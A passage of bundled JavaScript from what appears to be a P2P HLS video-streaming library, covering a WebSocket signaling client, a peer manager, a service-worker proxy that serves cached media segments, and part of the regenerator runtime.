            ws.send = function (msg) {
                // let msgStr = JSON.stringify(Object.assign({peer_id: id}, msg));
                var msgStr = JSON.stringify(msg);
                ws.push(msgStr);

                // this._resetPing();    // 重置心跳
            };
            ws.onmessage = function (e) {
                var data = e.data;
                // if(data instanceof ArrayBuffer) {
                //     this.logger.info(`received arraybuffer length ${data.byteLength}`);
                //     data = inflate(data, {to:'string'});
                //     // console.warn(`decompressed msg ${data}`);
                // }
                var msg = JSON.parse(data);

                var action = msg.action;
                if (action === 'pong') {
                    clearTimeout(_this2.pongTimer);
                    return;
                } else if (action === 'ver') {
                    _this2.serverVersion = msg.ver;
                    return;
                }

                if (_this2.onmessage) _this2.onmessage(msg);
            };
            ws.onclose = function (e) {
                //websocket断开时清除datachannel
                _this2.logger.warn(_this2.name + ' ' + _this2.wsAddr + ' closed ' + e.code + ' ' + e.reason);
                if (_this2.onclose) _this2.onclose();
                _this2.connected = false;
                _this2.connecting = false;
                _this2._stopPing(); // 停止心跳
                if (e.code === 1000) {
                    // 正常关闭

                } else {
                    _this2.connecting = true; // 防止调用reconnect
                }
            };
            ws.onerror = function (err) {
                _this2.logger.error(_this2.name + ' ' + _this2.wsAddr + ' error');
                _this2.connecting = false;
                _this2._stopPing(); // 停止心跳
                if (_this2.onerror) _this2.onerror(err);
            };
            return ws;
        }
    }, {
        key: 'sendSignal',
        value: function sendSignal(remotePeerId, data) {
            var msg = {
                action: 'signal',
                to_peer_id: remotePeerId,
                data: data
            };
            this._send(msg);
        }
    }, {
        key: 'sendReject',
        value: function sendReject(remotePeerId, reason, fatal) {
            var msg = {
                action: 'reject',
                to_peer_id: remotePeerId,
                reason: reason,
                fatal: fatal
            };
            this._send(msg);
        }
    }, {
        key: '_send',
        value: function _send(msg) {
            if (this.connected && this._ws) {
                // this.logger.info(`${this.name} send ${JSON.stringify(msg)}`);
                this._ws.send(msg);
            } else {
                this.logger.warn(this.name + ' closed, send msg ' + JSON.stringify(msg) + ' failed');
            }
        }
    }, {
        key: '_startPing',
        value: function _startPing() {
            var _this3 = this;

            var interval = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 120;

            if (this.connected && this._ws) {
                this.pingTimer = setInterval(function () {
                    var msg = {
                        action: 'ping'
                    };
                    _this3._send(msg);
                    if (_this3.name === 'signaler' && _this3.serverVersion >= 22) {
                        _this3._waitForPong();
                    }
                }, interval * 1000);
            }
        }
    }, {
        key: '_waitForPong',
        value: function _waitForPong() {
            var _this4 = this;

            this.pongTimer = setTimeout(function () {
                _this4.logger.warn(_this4.name + ' wait for pong timeout, reconnect');
                _this4.close();
                _this4.reconnect();
            }, PONG_TIMEOUT * 1000);
        }
    }, {
        key: '_resetPing',
        value: function _resetPing() {
            this._stopPing();
            this._startPing(this.pingInterval);
        }
    }, {
        key: '_stopPing',
        value: function _stopPing() {
            clearInterval(this.pingTimer);
            clearTimeout(this.pongTimer);
            this.pingTimer = null;
            this.pongTimer = null;
        }
    }, {
        key: 'close',
        value: function close() {
            this.logger.info('close ' + this.name);
            this._stopPing(); // 停止心跳
            if (!this.connected) return;
            this.connected = false;
            if (this._ws) this._ws.close(1000, 'normal close', { keepClosed: true });
        }
    }, {
        key: 'reconnect',
        value: function reconnect() {
            if (this.connected || this.connecting || !this._ws) return;
            this.connecting = true;
            this.logger.info('reconnect ' + this.name + ' client');
            this._ws = this._init();
        }
    }, {
        key: 'destroy',
        value: function destroy() {
            this.close();
            this._ws = null;
            this.removeAllListeners();
            this.engine = null;
            // this.logger.warn(`destroy ${this.name}`);
        }
    }]);

    return WebsocketClient;
}(_events2.default);

exports.default = WebsocketClient;
module.exports = exports['default'];

/***/ }),
/* 16 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

function assign(obj, props) {
    for (var key in props) {
        Object.defineProperty(obj, key, {
            value: props[key],
            enumerable: true,
            configurable: true
        });
    }

    return obj;
}

function createError(err, code, props) {
    if (!err || typeof err === 'string') {
        throw new TypeError('Please pass an Error to err-code');
    }

    if (!props) {
        props = {};
    }

    if ((typeof code === 'undefined' ? 'undefined' : _typeof(code)) === 'object') {
        props = code;
        code = undefined;
    }

    if (code != null) {
        props.code = code;
    }

    try {
        return assign(err, props);
    } catch (_) {
        props.message = err.message;
        props.stack = err.stack;

        var ErrClass = function ErrClass() {};

        ErrClass.prototype = Object.create(Object.getPrototypeOf(err));

        return assign(new ErrClass(), props);
    }
}

module.exports = createError;

/***/ }),
/* 17 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

function _toConsumableArray(arr) { if (Array.isArray(arr)) { for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) { arr2[i] = arr[i]; } return arr2; } else { return Array.from(arr); } }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var PeerManager = function () {
    function PeerManager() {
        _classCallCheck(this, PeerManager);

        this.peerMap = new Map(); // remotePeerId -> dc
    }

    _createClass(PeerManager, [{
        key: "isEmpty",
        value: function isEmpty() {
            return this.peerMap.size === 0;
        }
    }, {
        key: "size",
        value: function size() {
            return this.peerMap.size;
        }
    }, {
        key: "clear",
        value: function clear() {
            this.peerMap.clear();
        }
    }, {
        key: "getPeers",
        value: function getPeers() {
            return [].concat(_toConsumableArray(this.peerMap.values()));
        }
    }, {
        key: "getPeerValues",
        value: function getPeerValues() {
            return this.peerMap.values();
        }
    }, {
        key: "hasPeer",
        value: function hasPeer(peerId) {
            return this.peerMap.has(peerId);
        }
    }, {
        key: "addPeer",
        value: function addPeer(peerId, peer) {
            this.peerMap.set(peerId, peer);
        }
    }, {
        key: "getPeerIds",
        value: function getPeerIds() {
            return [].concat(_toConsumableArray(this.peerMap.keys()));
        }
    }, {
        key: "removePeer",
        value: function removePeer(peerId) {
            this.peerMap.delete(peerId);
        }
    }, {
        key: "getPeersOrderByWeight",
        value: function getPeersOrderByWeight() {

            var availablePeers = this.getPeers().filter(function (peer) {
                return peer.isAvailableUrgently;
            });
            // availablePeers.forEach(p => {
            //     console.warn(p.weight + "")
            // });
            availablePeers.sort(function (p1, p2) {
                if (p2.weight === 0) {
                    // weight是0的节点排在前面
                    return 1;
                } else if (p1.weight === 0) {
                    // weight是0的节点排在前面
                    return -1;
                }
                return p2.weight - p1.weight;
            });
            // console.warn("after");
            // availablePeers.forEach(p => {
            //     console.warn(p.weight + "")
            // });
            return availablePeers;
        }
    }, {
        key: "getPeer",
        value: function getPeer(peerId) {
            return this.peerMap.get(peerId);
        }
    }, {
        key: "getAvailablePeers",
        value: function getAvailablePeers() {
            return this.getPeers().filter(function (peer) {
                return peer.isAvailable;
            });
        }
    }]);

    return PeerManager;
}();

exports.default = PeerManager;
module.exports = exports["default"];

/***/ }),
/* 18 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _regenerator = __webpack_require__(10);

var _regenerator2 = _interopRequireDefault(_regenerator);

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _config = __webpack_require__(21);

var _messageClient = __webpack_require__(38);

var _messageClient2 = _interopRequireDefault(_messageClient);

var _logger = __webpack_require__(9);

var _logger2 = _interopRequireDefault(_logger);

var _events = __webpack_require__(39);

var _events2 = _interopRequireDefault(_events);

var _toolFunc = __webpack_require__(40);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _asyncToGenerator(fn) { return function () { var gen = fn.apply(this, arguments); return new Promise(function (resolve, reject) { function step(key, arg) { try { var info = gen[key](arg); var value = info.value; } catch (error) { reject(error); return; } if (info.done) { resolve(value); } else { return Promise.resolve(value).then(function (value) { step("next", value); }, function (err) { step("throw", err); }); } } return step("next"); }); }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var Buffer = __webpack_require__(3).Buffer;

var PLAYLIST_SUFFIX = ['m3u8'];
var PLAYLIST_SEND_TIMEOUT = 300;
var MEDIA_SEND_TIMEOUT = 1000;

var HlsProxy = function () {
    function HlsProxy() {
        var config = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

        _classCallCheck(this, HlsProxy);

        var swConfig = Object.assign({}, _config.defaultPloxyConfig, config);

        this.config = swConfig;
        this.version = swConfig.version;
        this.hlsMediaFiles = this.config.hlsMediaFiles;
        this.mediaFileLoadTimeout = this.config.mediaFileLoadTimeout;
        this.client = null;
        this.msgClient = new _messageClient2.default();

        var logger = new _logger2.default(swConfig.logLevel);
        swConfig.logger = this.logger = logger;
    }

    _createClass(HlsProxy, [{
        key: "onActivate",
        value: function () {
            var _ref = _asyncToGenerator( /*#__PURE__*/_regenerator2.default.mark(function _callee(event) {
                return _regenerator2.default.wrap(function _callee$(_context) {
                    while (1) {
                        switch (_context.prev = _context.next) {
                            case 0:
                            case "end":
                                return _context.stop();
                        }
                    }
                }, _callee, this);
            }));

            function onActivate(_x2) {
                return _ref.apply(this, arguments);
            }

            return onActivate;
        }()
    }, {
        key: "onFetch",
        value: function () {
            var _ref2 = _asyncToGenerator( /*#__PURE__*/_regenerator2.default.mark(function _callee2(event) {
                var logger, request, url, suffix;
                return _regenerator2.default.wrap(function _callee2$(_context2) {
                    while (1) {
                        switch (_context2.prev = _context2.next) {
                            case 0:
                                logger = this.logger;
                                request = event.request;

                                if (!(request.method !== 'GET')) {
                                    _context2.next = 4;
                                    break;
                                }

                                return _context2.abrupt("return");

                            case 4:
                                logger.info(event.request.url);
                                // console.warn(event.request.url);
                                url = request.url;
                                suffix = (0, _toolFunc.getUrlSuffix)(url);

                                if (!PLAYLIST_SUFFIX.includes(suffix)) {
                                    _context2.next = 9;
                                    break;
                                }

                                return _context2.abrupt("return", this.handlePlaylistRequest(request));

                            case 9:
                                if (!this.hlsMediaFiles.includes(suffix)) {
                                    _context2.next = 11;
                                    break;
                                }

                                return _context2.abrupt("return", this.handleMediaRequest(request));

                            case 11:
                            case "end":
                                return _context2.stop();
                        }
                    }
                }, _callee2, this);
            }));

            function onFetch(_x3) {
                return _ref2.apply(this, arguments);
            }

            return onFetch;
        }()
    }, {
        key: "handlePlaylistRequest",
        value: function handlePlaylistRequest(request) {
            var _this = this;

            var logger = this.logger;
            // console.warn(request);

            return fetch(new Request(request.url, { mode: "cors" })).then(function () {
                var _ref3 = _asyncToGenerator( /*#__PURE__*/_regenerator2.default.mark(function _callee4(resp) {
                    return _regenerator2.default.wrap(function _callee4$(_context4) {
                        while (1) {
                            switch (_context4.prev = _context4.next) {
                                case 0:
                                    if (!resp.ok) {
                                        _context4.next = 13;
                                        break;
                                    }

                                    _context4.t0 = _this.msgClient;
                                    _context4.t1 = _events2.default.SW_PLAYLIST;
                                    _context4.t2 = request.url;
                                    _context4.next = 6;
                                    return resp.clone().text();

                                case 6:
                                    _context4.t3 = _context4.sent;
                                    _context4.t4 = {
                                        url: _context4.t2,
                                        text: _context4.t3
                                    };
                                    _context4.t5 = {
                                        action: _context4.t1,
                                        data: _context4.t4
                                    };
                                    _context4.t6 = PLAYLIST_SEND_TIMEOUT;

                                    _context4.t7 = function () {
                                        var _ref4 = _asyncToGenerator( /*#__PURE__*/_regenerator2.default.mark(function _callee3(resp) {
                                            var client, data;
                                            return _regenerator2.default.wrap(function _callee3$(_context3) {
                                                while (1) {
                                                    switch (_context3.prev = _context3.next) {
                                                        case 0:
                                                            client = resp.client, data = resp.data;
                                                            // console.warn(`client resp ${JSON.stringify(data)}`);

                                                            _context3.next = 3;
                                                            return _this.msgClient.isClientAlive(client);

                                                        case 3:
                                                            if (!_context3.sent) {
                                                                _context3.next = 5;
                                                                break;
                                                            }

                                                            _this.client = client;

                                                        case 5:
                                                            if (data.debug) {
                                                                _this.logger.enableDebug();
                                                            } else {
                                                                _this.logger.resetLogger();
                                                            }

                                                        case 6:
                                                        case "end":
                                                            return _context3.stop();
                                                    }
                                                }
                                            }, _callee3, _this);
                                        }));

                                        return function (_x5) {
                                            return _ref4.apply(this, arguments);
                                        };
                                    }();

                                    _context4.t8 = function (err) {
                                        logger.warn(err);
                                        _this.client = null;
                                    };

                                    _context4.t0.sendMessageToAllClients.call(_context4.t0, _context4.t5, _context4.t6).then(_context4.t7).catch(_context4.t8);

                                case 13:
                                    return _context4.abrupt("return", resp);

                                case 14:
                                case "end":
                                    return _context4.stop();
                            }
                        }
                    }, _callee4, _this);
                }));

                return function (_x4) {
                    return _ref3.apply(this, arguments);
                };
            }());
        }
    }, {
        key: "handleMediaRequest",
        value: function () {
            var _ref5 = _asyncToGenerator( /*#__PURE__*/_regenerator2.default.mark(function _callee7(request) {
                var _this2 = this;

                var logger, headers, range, requestFromNetwork;
                return _regenerator2.default.wrap(function _callee7$(_context7) {
                    while (1) {
                        switch (_context7.prev = _context7.next) {
                            case 0:
                                logger = this.logger;
                                headers = request.headers;
                                range = headers.get("range") || undefined;

                                requestFromNetwork = function requestFromNetwork() {
                                    logger.info("request " + request.url + " from network");
                                    var headers = _this2.makeHeadersWithRange(range);
                                    return fetch(new Request(request.url, { headers: headers, mode: "cors" })).then(function () {
                                        var _ref6 = _asyncToGenerator( /*#__PURE__*/_regenerator2.default.mark(function _callee5(resp) {
                                            return _regenerator2.default.wrap(function _callee5$(_context5) {
                                                while (1) {
                                                    switch (_context5.prev = _context5.next) {
                                                        case 0:
                                                            if (!(resp.ok && _this2.client)) {
                                                                _context5.next = 14;
                                                                break;
                                                            }

                                                            _context5.t0 = _this2.msgClient;
                                                            _context5.t1 = _this2.client;
                                                            _context5.t2 = _events2.default.SW_MEDIA;
                                                            _context5.t3 = request.url;
                                                            _context5.next = 7;
                                                            return resp.clone().arrayBuffer();

                                                        case 7:
                                                            _context5.t4 = _context5.sent;
                                                            _context5.t5 = range;
                                                            _context5.t6 = {
                                                                url: _context5.t3,
                                                                buffer: _context5.t4,
                                                                range: _context5.t5
                                                            };
                                                            _context5.t7 = {
                                                                action: _context5.t2,
                                                                data: _context5.t6
                                                            };
                                                            _context5.t8 = MEDIA_SEND_TIMEOUT;

                                                            _context5.t9 = function (err) {
                                                                logger.warn(err);
                                                            };

                                                            _context5.t0.sendMessageToClient.call(_context5.t0, _context5.t1, _context5.t7, _context5.t8).catch(_context5.t9);

                                                        case 14:
                                                            return _context5.abrupt("return", resp);

                                                        case 15:
                                                        case "end":
                                                            return _context5.stop();
                                                    }
                                                }
                                            }, _callee5, _this2);
                                        }));

                                        return function (_x7) {
                                            return _ref6.apply(this, arguments);
                                        };
                                    }());
                                };

                                if (!this.client) {
                                    _context7.next = 8;
                                    break;
                                }

                                return _context7.abrupt("return", this.msgClient.sendMessageToClient(this.client, {
                                    action: _events2.default.SW_GET_MEDIA,
                                    data: {
                                        url: request.url,
                                        range: range
                                    }
                                }, this.mediaFileLoadTimeout).then(function () {
                                    var _ref7 = _asyncToGenerator( /*#__PURE__*/_regenerator2.default.mark(function _callee6(resp) {
                                        var data, url, buffer, incomplete;
                                        return _regenerator2.default.wrap(function _callee6$(_context6) {
                                            while (1) {
                                                switch (_context6.prev = _context6.next) {
                                                    case 0:
                                                        data = resp.data;
                                                        // console.warn(`client resp`);
                                                        // console.warn(data);

                                                        if (!(data && data.buffer)) {
                                                            _context6.next = 9;
                                                            break;
                                                        }

                                                        url = data.url, buffer = data.buffer, incomplete = data.incomplete;

                                                        logger.info("hit cache " + url);

                                                        if (incomplete) {
                                                            _context6.next = 6;
                                                            break;
                                                        }

                                                        return _context6.abrupt("return", data.buffer);

                                                    case 6:
                                                        _context6.next = 8;
                                                        return _this2.loadRemainBufferByHttp(url, buffer, range);

                                                    case 8:
                                                        return _context6.abrupt("return", _context6.sent);

                                                    case 9:
                                                        return _context6.abrupt("return", requestFromNetwork());

                                                    case 10:
                                                    case "end":
                                                        return _context6.stop();
                                                }
                                            }
                                        }, _callee6, _this2);
                                    }));

                                    return function (_x8) {
                                        return _ref7.apply(this, arguments);
                                    };
                                }()).catch(function (e) {
                                    logger.warn(e);
                                    return requestFromNetwork();
                                }));

                            case 8:
                                logger.warn("client not exist when get media");

                            case 9:
                                return _context7.abrupt("return", requestFromNetwork());

                            case 10:
                            case "end":
                                return _context7.stop();
                        }
                    }
                }, _callee7, this);
            }));

            function handleMediaRequest(_x6) {
                return _ref5.apply(this, arguments);
            }

            return handleMediaRequest;
        }()
    }, {
        key: "onMessage",
        value: function () {
            var _ref8 = _asyncToGenerator( /*#__PURE__*/_regenerator2.default.mark(function _callee8(event) {
                var data, action, resp;
                return _regenerator2.default.wrap(function _callee8$(_context8) {
                    while (1) {
                        switch (_context8.prev = _context8.next) {
                            case 0:
                                if (!event.ports[0]) {
                                    _context8.next = 2;
                                    break;
                                }

                                return _context8.abrupt("return");

                            case 2:
                                data = event.data;

                                this.logger.info("SW Received Message: " + JSON.stringify(data));
                                action = data.action;
                                resp = {};

                                switch (action) {}
                                // console.warn(`sw postMessage ${JSON.stringify(resp)}`)
                                event.source.postMessage(resp);

                            case 8:
                            case "end":
                                return _context8.stop();
                        }
                    }
                }, _callee8, this);
            }));

            function onMessage(_x9) {
                return _ref8.apply(this, arguments);
            }

            return onMessage;
        }()
    }, {
        key: "register",
        value: function register() {
            self.addEventListener('install', function (event) {
                // event.waitUntil(self.skipWaiting());
                self.skipWaiting();
            });
            self.addEventListener('activate', this.onActivate.bind(this));
            self.addEventListener('fetch', this.onFetch.bind(this));
            self.addEventListener('message', this.onMessage.bind(this));
        }
    }, {
        key: "loadRemainBufferByHttp",
        value: function loadRemainBufferByHttp(url, loadedBuf, rangeStr) {
            var _this3 = this;

            var logger = this.logger,
                msgClient = this.msgClient;
            // 发起http请求

            var range = "bytes=";
            if (rangeStr) {
                var _parseRangeHeader = (0, _toolFunc.parseRangeHeader)(rangeStr),
                    start = _parseRangeHeader.start,
                    end = _parseRangeHeader.end;

                logger.info("rangeStart " + start + " rangeEnd " + end);
                range = "" + range + (start + loadedBuf.byteLength) + "-" + (end - 1);
            } else {
                range = "" + range + loadedBuf.byteLength + "-";
            }

            logger.info("continue download from " + url + " range: " + range);

            return fetch(url, {
                headers: {
                    Range: range
                },
                mode: "cors"
            }).then(function (response) {
                return response.arrayBuffer();
            }).then(function (buffer) {

                var httpPayload = Buffer.from(buffer);
                var data = Buffer.concat([loadedBuf, httpPayload]);
                var resp = new Uint8Array(data).buffer; // 将uint8array转为arraybuffer
                msgClient.sendMessageToClient(_this3.client, {
                    action: _events2.default.SW_MEDIA,
                    data: {
                        url: url,
                        buffer: resp,
                        range: range
                    }
                }, MEDIA_SEND_TIMEOUT).catch(function (err) {
                    logger.warn(err);
                });
                return resp;
            }).catch(function (err) {
                _this3.logger.error("http partial download error " + err);
            });
        }
    }, {
        key: "makeHeadersWithRange",
        value: function makeHeadersWithRange(range) {
            var headers = new Headers();
            if (range) {
                headers.set('range', range);
            }
            return headers;
        }
    }]);

    return HlsProxy;
}();

exports.default = HlsProxy;


HlsProxy.version = "0.0.1";
module.exports = exports["default"];

/***/ }),
/* 19 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


/**
 * Copyright (c) 2014-present, Facebook, Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */

// This method of obtaining a reference to the global object needs to be
// kept identical to the way it is obtained in runtime.js
var g = function () {
  return this;
}() || Function("return this")();

// Use `getOwnPropertyNames` because not all browsers support calling
// `hasOwnProperty` on the global `self` object in a worker. See #183.
var hadRuntime = g.regeneratorRuntime && Object.getOwnPropertyNames(g).indexOf("regeneratorRuntime") >= 0;

// Save the old regeneratorRuntime in case it needs to be restored later.
var oldRuntime = hadRuntime && g.regeneratorRuntime;

// Force reevalutation of runtime.js.
g.regeneratorRuntime = undefined;

module.exports = __webpack_require__(20);

if (hadRuntime) {
  // Restore the original runtime.
  g.regeneratorRuntime = oldRuntime;
} else {
  // Remove the global property added by runtime.js.
  try {
    delete g.regeneratorRuntime;
  } catch (e) {
    g.regeneratorRuntime = undefined;
  }
}

/***/ }),
/* 20 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";
/* WEBPACK VAR INJECTION */(function(module) {

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

/**
 * Copyright (c) 2014-present, Facebook, Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */

!function (global) {
  "use strict";

  var Op = Object.prototype;
  var hasOwn = Op.hasOwnProperty;
  var undefined; // More compressible than void 0.
  var $Symbol = typeof Symbol === "function" ? Symbol : {};
  var iteratorSymbol = $Symbol.iterator || "@@iterator";
  var asyncIteratorSymbol = $Symbol.asyncIterator || "@@asyncIterator";
  var toStringTagSymbol = $Symbol.toStringTag || "@@toStringTag";

  var inModule = ( false ? "undefined" : _typeof(module)) === "object";
  var runtime = global.regeneratorRuntime;
  if (runtime) {
    if (inModule) {
      // If regeneratorRuntime is defined globally and we're in a module,
      // make the exports object identical to regeneratorRuntime.
      module.exports = runtime;
    }
    // Don't bother evaluating the rest of this file if the runtime was
    // already defined globally.
    return;
  }

  // Define the runtime globally (as expected by generated code) as either
  // module.exports (if we're in a module) or a new, empty object.
  runtime = global.regeneratorRuntime = inModule ? module.exports : {};

  function wrap(innerFn, outerFn, self, tryLocsList) {
    // If outerFn provided and outerFn.prototype is a Generator, then outerFn.prototype instanceof Generator.
    var protoGenerator = outerFn && outerFn.prototype instanceof Generator ? outerFn : Generator;
    var generator = Object.create(protoGenerator.prototype);
    var context = new Context(tryLocsList || []);

    // The ._invoke method unifies the implementations of the .next,
    // .throw, and .return methods.
    generator._invoke = makeInvokeMethod(innerFn, self, context);

    return generator;
  }
  runtime.wrap = wrap;

  // Try/catch helper to minimize deoptimizations. Returns a completion
  // record like context.tryEntries[i].completion. This interface could
  // have been (and was previously) designed to take a closure to be
  // invoked without arguments, but in all the cases we care about we
  // already have an existing method we want to call, so there's no need
  // to create a new function object. We can even get away with assuming
  // the method takes exactly one argument, since that happens to be true
  // in every case, so we don't have to touch the arguments object. The
  // only additional allocation required is the completion record, which
  // has a stable shape and so hopefully should be cheap to allocate.
  function tryCatch(fn, obj, arg) {
    try {
      return { type: "normal", arg: fn.call(obj, arg) };
    } catch (err) {
      return { type: "throw", arg: err };
    }
  }

  var GenStateSuspendedStart = "suspendedStart";
  var GenStateSuspendedYield = "suspendedYield";
  var GenStateExecuting = "executing";
  var GenStateCompleted = "completed";

  // Returning this object from the innerFn has the same effect as
  // breaking out of the dispatch switch statement.
  var ContinueSentinel = {};

  // Dummy constructor functions that we use as the .constructor and
  // .constructor.prototype properties for functions that return Generator
  // objects. For full spec compliance, you may wish to configure your
  // minifier not to mangle the names of these two functions.
  function Generator() {}
  function GeneratorFunction() {}
  function GeneratorFunctionPrototype() {}

  // This is a polyfill for %IteratorPrototype% for environments that
  // don't natively support it.
  var IteratorPrototype = {};
  IteratorPrototype[iteratorSymbol] = function () {
    return this;
  };

  var getProto = Object.getPrototypeOf;
  var NativeIteratorPrototype = getProto && getProto(getProto(values([])));
  if (NativeIteratorPrototype && NativeIteratorPrototype !== Op && hasOwn.call(NativeIteratorPrototype, iteratorSymbol)) {
    // This environment has a native %IteratorPrototype%; use it instead
    // of the polyfill.
    IteratorPrototype = NativeIteratorPrototype;
  }

  var Gp = GeneratorFunctionPrototype.prototype = Generator.prototype = Object.create(IteratorPrototype);
  GeneratorFunction.prototype = Gp.constructor = GeneratorFunctionPrototype;
  GeneratorFunctionPrototype.constructor = GeneratorFunction;
  GeneratorFunctionPrototype[toStringTagSymbol] = GeneratorFunction.displayName = "GeneratorFunction";

  // Helper for defining the .next, .throw, and .return methods of the
  // Iterator interface in terms of a single ._invoke method.
  function defineIteratorMethods(prototype) {
    ["next", "throw", "return"].forEach(function (method) {
      prototype[method] = function (arg) {
        return this._invoke(method, arg);
      };
    });
  }

  runtime.isGeneratorFunction = function (genFun) {
    var ctor = typeof genFun === "function" && genFun.constructor;
    return ctor ? ctor === GeneratorFunction ||
    // For the native GeneratorFunction constructor, the best we can
    // do is to check its .name property.
    (ctor.displayName || ctor.name) === "GeneratorFunction" : false;
  };

  runtime.mark = function (genFun) {
    if (Object.setPrototypeOf) {
      Object.setPrototypeOf(genFun, GeneratorFunctionPrototype);
    } else {
      genFun.__proto__ = GeneratorFunctionPrototype;
      if (!(toStringTagSymbol in genFun)) {
        genFun[toStringTagSymbol] = "GeneratorFunction";
      }
    }
    genFun.prototype = Object.create(Gp);
    return genFun;
  };

  // Within the body of any async function, `await x` is transformed to
  // `yield regeneratorRuntime.awrap(x)`, so that the runtime can test
  // `hasOwn.call(value, "__await")` to determine if the yielded value is
  // meant to be awaited.
  runtime.awrap = function (arg) {
    return { __await: arg };
  };

  function AsyncIterator(generator) {
    function invoke(method, arg, resolve, reject) {
      var record = tryCatch(generator[method], generator, arg);
      if (record.type === "throw") {
        reject(record.arg);
      } else {
        var result = record.arg;
        var value = result.value;
        if (value && (typeof value === "undefined" ? "undefined" : _typeof(value)) === "object" && hasOwn.call(value, "__await")) {
          return Promise.resolve(value.__await).then(function (value) {
            invoke("next", value, resolve, reject);
          }, function (err) {
            invoke("throw", err, resolve, reject);
          });
        }

        return Promise.resolve(value).then(function (unwrapped) {
          // When a yielded Promise is resolved, its final value becomes
          // the .value of the Promise<{value,done}> result for the
          // current iteration. If the Promise is rejected, however, the
          // result for this iteration will be rejected with the same
          // reason. Note that rejections of yielded Promises are not
          // thrown back into the generator function, as is the case
          // when an awaited Promise is rejected. This difference in
          // behavior between yield and await is important, because it
          // allows the consumer to decide what to do with the yielded
          // rejection (swallow it and continue, manually .throw it back
          // into the generator, abandon iteration, whatever). With
          // await, by contrast, there is no opportunity to examine the
          // rejection reason outside the generator function, so the
          // only option is to throw it from the await expression, and
          // let the generator function handle the exception.
          result.value = unwrapped;
          resolve(result);
        }, reject);
      }
    }

    var previousPromise;

    function enqueue(method, arg) {
      function callInvokeWithMethodAndArg() {
        return new Promise(function (resolve, reject) {
          invoke(method, arg, resolve, reject);
        });
      }

      return previousPromise =
      // If enqueue has been called before, then we want to wait until
      // all previous Promises have been resolved before calling invoke,
      // so that results are always delivered in the correct order. If
      // enqueue has not been called before, then it is important to
      // call invoke immediately, without waiting on a callback to fire,
      // so that the async generator function has the opportunity to do
      // any necessary setup in a predictable way. This predictability
      // is why the Promise constructor synchronously invokes its
      // executor callback, and why async functions synchronously
      // execute code before the first await. Since we implement simple
      // async functions in terms of async generators, it is especially
      // important to get this right, even though it requires care.
      previousPromise ? previousPromise.then(callInvokeWithMethodAndArg,
      // Avoid propagating failures to Promises returned by later
      // invocations of the iterator.
      callInvokeWithMethodAndArg) : callInvokeWithMethodAndArg();
    }

    // Define the unified helper method that is used to implement .next,
    // .throw, and .return (see defineIteratorMethods).
    this._invoke = enqueue;
  }

  defineIteratorMethods(AsyncIterator.prototype);
  AsyncIterator.prototype[asyncIteratorSymbol] = function () {
    return this;
  };
  runtime.AsyncIterator = AsyncIterator;

  // Note that simple async functions are implemented on top of
  // AsyncIterator objects; they just return a Promise for the value of
  // the final result produced by the iterator.
  runtime.async = function (innerFn, outerFn, self, tryLocsList) {
    var iter = new AsyncIterator(wrap(innerFn, outerFn, self, tryLocsList));

    return runtime.isGeneratorFunction(outerFn) ? iter // If outerFn is a generator, return the full iterator.
    : iter.next().then(function (result) {
      return result.done ? result.value : iter.next();
    });
  };

  function makeInvokeMethod(innerFn, self, context) {
    var state = GenStateSuspendedStart;

    return function invoke(method, arg) {
      if (state === GenStateExecuting) {
        throw new Error("Generator is already running");
      }

      if (state === GenStateCompleted) {
        if (method === "throw") {
          throw arg;
        }

        // Be forgiving, per 25.3.3.3.3 of the spec:
        // https://people.mozilla.org/~jorendorff/es6-draft.html#sec-generatorresume
        return doneResult();
      }

      context.method = method;
      context.arg = arg;

      while (true) {
        var delegate = context.delegate;
        if (delegate) {
          var delegateResult = maybeInvokeDelegate(delegate, context);
          if (delegateResult) {
            if (delegateResult === ContinueSentinel) continue;
            return delegateResult;
          }
        }

        if (context.method === "next") {
          // Setting context._sent for legacy support of Babel's
          // function.sent implementation.
          context.sent = context._sent = context.arg;
        } else if (context.method === "throw") {
          if (state === GenStateSuspendedStart) {
            state = GenStateCompleted;
            throw context.arg;
          }

          context.dispatchException(context.arg);
        } else if (context.method === "return") {
          context.abrupt("return", context.arg);
        }

        state = GenStateExecuting;

        var record = tryCatch(innerFn, self, context);
        if (record.type === "normal") {
          // If an exception is thrown from innerFn, we leave state ===
          // GenStateExecuting and loop back for another invocation.
          state = context.done ? GenStateCompleted : GenStateSuspendedYield;

